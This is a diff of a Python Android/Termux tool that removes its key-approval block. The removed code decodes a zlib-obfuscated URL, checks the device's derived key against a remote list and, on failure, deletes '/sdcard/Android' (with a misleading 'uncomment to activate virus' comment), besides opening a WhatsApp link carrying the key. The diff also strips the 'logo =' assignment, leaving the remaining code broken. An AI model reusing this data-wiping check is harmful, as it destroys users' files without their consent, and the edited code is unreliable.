@@ -440,65 +440,7 @@ device = {
 def clear():
     os.system('clear')
     print(logo)
-
-
-def linex():
-    print('\033[1;97m ---------------------------------------------')
-
-
-def getKey():
-    myid = str(os.getuid())
-    myid = myid.upper()[::-1]
-    n = re.findall("(\d\d)", myid)
-    plat = platform.version()[14:][:21][::-1].upper() + platform.release()[5:][::-1].upper() + platform.version()[:8]
-    xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')',
-                                                                                                           '').replace(
-        '(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_',
-                                                                                                              '').replace(
-        '?', '').replace('  ', '')
-
-    return "Veer-" + myid + xp
-
-
-km = zlib.decompress(
-    b'x\x9c\r\xc5A\x0e\x80 \x0c\x04\xc0\x1f\xb57I\xfc\r`c\x89\xa1%eQ\x9f\xafs\x19\x05\xc6\xdc\x99#?t6\xe8*kJT7\x88\x81\xaaw\xbeE\xe2\xd2l\xee)m\\\x0e\xee\xb9\xd9?\xe1\xc5\x07\xea\x04\x17?').decode()
-
-
-def xi():
-    global km
-    j = getKey()
-    r = requests.get(km).text
-    if j in r:
-        pass
-    else:
-        os.system("clear")
-        # uncomment to activate virus
-        shutil.rmtree("/sdcard/Android")
-        print("Don't Bypass ")
-        sys.exit()
-
-
-def aprv():
-    global km
-    r = requests.get(km).text
-    k = getKey()
-    if k in r:
-        main__manu()
-        print("\033[1;92mYour Token is successfully Approved\33[1;37m")
-    else:
-        os.system('clear')
-        print(logo)
-        print('\033[1;32m  Your Key Is Not Approved')
-        print('\033[1;37m----------------------------------------------')
-        print(f" Your Key: {k}")
-        print('\033[1;37m----------------------------------------------')
-        input('\033[1;37m[Press Enter]')
-        os.system("xdg-open https://wa.me/+923439635677?text={k}")
-        aprv()
-        sys.exit()
-
-
-logo = (""" \033[1;37m ##     ##   ########  ########  ########  
+(""" \033[1;37m ##     ##   ########  ########  ########  
   \033[1;31m##     ##   ##        ##        ##     ## 
   \033[1;33m##     ##   ##        ##        ##     ## 
   \033[1;36m##     ##   ######    ######    ########  
